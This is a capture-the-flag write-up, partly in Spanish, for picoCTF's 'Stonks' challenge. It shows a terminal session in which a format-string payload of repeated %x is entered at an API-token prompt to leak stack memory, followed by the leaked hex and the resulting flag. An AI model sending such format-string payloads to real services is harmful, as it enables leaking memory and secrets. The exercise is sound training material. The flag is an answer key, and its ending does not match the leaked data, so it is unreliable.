# Stonks

## Descripción
I decided to try something noone else has before. I made a bot to automatically trade stonks for me using AI and machine learning. I wouldn't believe you if you told me it's unsecure! [vuln.c](https://mercury.picoctf.net/static/17ba7f9351aca192c45833c658742fe5/vuln.c) `nc mercury.picoctf.net 27912`
## Pistas
Okay, maybe I'd believe you if you find my API key.
## Solución
```bash
┌──(kali㉿kali)-[~/Documents/binaryExplloitation/stonks]
└─$ wget https://mercury.picoctf.net/static/17ba7f9351aca192c45833c658742fe5/vuln.c
--2023-05-16 15:27:00--  https://mercury.picoctf.net/static/17ba7f9351aca192c45833c658742fe5/vuln.c
Resolving mercury.picoctf.net (mercury.picoctf.net)... 18.189.209.142
Connecting to mercury.picoctf.net (mercury.picoctf.net)|18.189.209.142|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2744 (2.7K) [application/octet-stream]
Saving to: ‘vuln.c’

vuln.c               100%[===================>]   2.68K  --.-KB/s    in 0s      

2023-05-16 15:27:00 (62.9 MB/s) - ‘vuln.c’ saved [2744/2744]

                                                                                 
┌──(kali㉿kali)-[~/Documents/binaryExplloitation/stonks]
└─$ nc mercury.picoctf.net 27912          
Welcome back to the trading app!

What would you like to do?
1) Buy some stonks!
2) View my portfolio
1
Using patented AI algorithms to buy stonks
Stonks chosen
What is your API token?
%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x
Buying stonks with token:
8596390804b00080489c3f7fc0d80ffffffff18594160f7fce110f7fc0dc70859518027859637085963906f6369707b465443306c5f49345f74356d5f6c6c306d5f795f79336e3266633130613130ffa0007df7ffbaf8f7fce44023deb10010f7e5dce9f7fcf0c0f7fc05c0f7fc0000ffa06b08f7e4e68df7fc05c08048ecaffa06b140f7fe2f09804b000f7fc0000f7fc0e20ffa06b48f7fe8d50
Portfolio as of Tue May 16 19:28:33 UTC 2023


39 shares of F
313 shares of XL
63 shares of SQ
202 shares of TP
1224 shares of N
Goodbye!
         
h```
Ahora tenemos que ir a un convertor de Hexadecimal poner los digitos que nos dio cuando entramos al puerto y nos dará la bandera en un orden erroneo
Tendremos que ir a python y ejecutar una sentencia para acomodar la bandera
## Bandera
picoCTF{I_l0st_4ll_my_m0ney_4c6526s}

## Notas Adicionales 

## Referencias